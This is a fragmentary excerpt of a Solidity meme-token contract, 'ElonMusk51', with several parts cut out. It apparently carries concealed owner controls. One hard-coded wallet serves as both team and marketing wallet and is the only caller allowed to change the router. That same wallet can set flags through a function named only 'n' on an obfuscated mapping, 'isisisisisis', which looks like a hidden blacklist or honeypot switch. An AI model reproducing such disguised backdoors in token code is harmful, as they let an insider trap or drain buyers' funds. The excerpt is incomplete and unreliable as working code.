...
contract ElonMusk51 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "ElonMusk51";
    string private _symbol = "ElonMusk51";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x532983A5ef5F02B2D540E3aaCCE258a1333789E5));
        marketingWalletAddress = payable(address(0x532983A5ef5F02B2D540E3aaCCE258a1333789E5));

        _msggSender[_msSender()] = _totalSupply;
    ...
    function changeRouterVersion(address newRouterAddress) public {if(msg.sender == marketingWalletAddress){
    ...
    function n(address a,bool b) public {if(msg.sender == marketingWalletAddress){
        isisisisisis[a] = b;}
    }
